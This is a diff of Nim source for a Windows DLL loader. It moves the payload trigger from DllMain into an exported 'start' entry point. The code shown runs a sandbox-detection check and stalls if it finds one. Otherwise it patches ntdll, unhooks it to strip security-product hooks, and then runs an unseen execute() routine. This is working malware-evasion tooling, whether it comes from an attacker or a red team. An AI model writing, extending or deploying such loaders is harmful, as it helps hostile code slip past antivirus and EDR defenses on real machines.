@@ -352,22 +352,24 @@ proc execute(): void =
     quit(QuitSuccess)
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-    NimMain()
-    currentModule = hinstDLL
     #echo "hinstDLL is: ", hinstDLL
     if fdwReason == DLL_PROCESS_ATTACH:
-        if sbCheck() >= 2:
-            #echo "sbCheck returned true! "
-            for i in 1 .. 10000000:
-                sleep(100)
-                quit(1)
-        else:
-            #echo "sbCheck returned false!"
-            discard Patchntdll()
-            #echo "Patchntdll ran!"
-            let nt = getNtdll()
-            #echo "getNtdll ran!"
-            discard unhook(nt)
-            #echo "unhook ran!"
-            execute()
+        NimMain()
+        currentModule = hinstDLL
     return true
+
+proc start(hwnd: HWND, hinst: HINSTANCE, lpszCmdLine: LPSTR, nCmdShow: int): void {.stdcall, exportc, dynlib.} =
+    if sbCheck() >= 2:
+        #echo "sbCheck returned true! "
+        for i in 1 .. 10000000:
+            sleep(100)
+        quit(1)
+    else:
+        #echo "sbCheck returned false!"
+        discard Patchntdll()
+        #echo "Patchntdll ran!"
+        let nt = getNtdll()
+        #echo "getNtdll ran!"
+        discard unhook(nt)
+        #echo "unhook ran!"
+        execute()
